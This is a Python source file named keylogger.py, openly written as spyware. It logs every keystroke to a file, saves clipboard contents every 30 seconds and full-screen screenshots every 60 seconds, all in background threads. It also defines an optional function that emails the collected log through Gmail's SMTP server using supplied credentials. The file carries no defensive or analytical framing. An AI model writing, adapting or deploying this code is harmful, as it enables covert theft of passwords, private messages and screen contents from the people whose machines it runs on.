# keylogger.py
import pynput.keyboard
import threading
import time
from PIL import ImageGrab
import pyperclip
import os
import smtplib
from email.message import EmailMessage

# Configuration
LOG_FILE = "keystrokes.log"
SCREENSHOT_DIR = "screenshots"
SCREENSHOT_INTERVAL = 60  # seconds
CLIPBOARD_INTERVAL = 30  # seconds

# Initialize directories and log file
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

with open(LOG_FILE, "w") as f:
    f.write("Keylogger started at: " + time.ctime() + "\n")

# Keylogger function
def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(str(key) + "\n")
    except Exception as e:
        print(f"Error: {e}")

def start_keylogger():
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    return listener

# Clipboard logger
def log_clipboard(log_file):
    try:
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            with open(log_file, "a") as f:
                f.write("[Clipboard]: " + clipboard_content + "\n")
    except Exception as e:
        print(f"Clipboard Logger Error: {e}")

# Screenshot logger
def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        screenshot.save(os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png"))
    except Exception as e:
        print(f"Screenshot Logger Error: {e}")

# Email sender (optional)
def send_email(log_file, sender_email, sender_password, receiver_email):
    try:
        msg = EmailMessage()
        msg['Subject'] = 'Keylogger Logs'
        msg['From'] = sender_email
        msg['To'] = receiver_email

        with open(log_file, 'r') as f:
            msg.set_content(f.read())

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)
            print("Email sent successfully!")
    except Exception as e:
        print(f"Email Sender Error: {e}")

# Threaded functions for clipboard and screenshots
def clipboard_thread():
    while True:
        log_clipboard(LOG_FILE)
        time.sleep(CLIPBOARD_INTERVAL)

def screenshot_thread():
    while True:
        capture_screenshot()
        time.sleep(SCREENSHOT_INTERVAL)

# Main Execution
if __name__ == '__main__':
    keylogger = start_keylogger()
    threading.Thread(target=clipboard_thread, daemon=True).start()
    threading.Thread(target=screenshot_thread, daemon=True).start()
    keylogger.join()
